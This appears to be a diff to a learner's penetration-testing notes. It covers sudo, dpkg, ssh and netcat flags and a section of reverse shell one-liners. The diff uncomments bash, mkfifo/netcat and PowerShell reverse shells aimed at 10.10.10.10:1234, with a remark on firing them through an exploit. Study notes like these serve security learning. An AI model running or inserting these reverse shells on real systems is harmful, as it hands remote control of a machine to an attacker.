@@ -13,9 +13,17 @@ how to connect to a VPN
 ## netstat -rn
 - shows you the networks available via the vpn
 
+## sudo
+- the -u flag lets you specify a user in which you wish to sudo as.
+- the -l flag lets you list every sudoer user.
+
+## dpkg
+- dpkg -l lists all packages installed on the system.
 
 ## SSH
 - Use 'ssh user@host' to safely remotely access a computer. Very useful utility
+- -p flag lets you specify a port
+- -i lets you specify a private key file you can use to login. No password required, just the private key.
 ## Netcat
 Allows you to grab the banner of a given service running on a port. Also lets you set your ports to listening mode so it awaits incoming connections.
 - 'nc <host> <port>'
@@ -110,11 +118,11 @@ Tool that lets you download stuff from certain ports.
 
 A few standard commands are 
 ## Linux
-- # bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+- bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ## Also bash
-- # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ## Powershell
-- # powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()" 
+-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()" 
 
 
 We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection
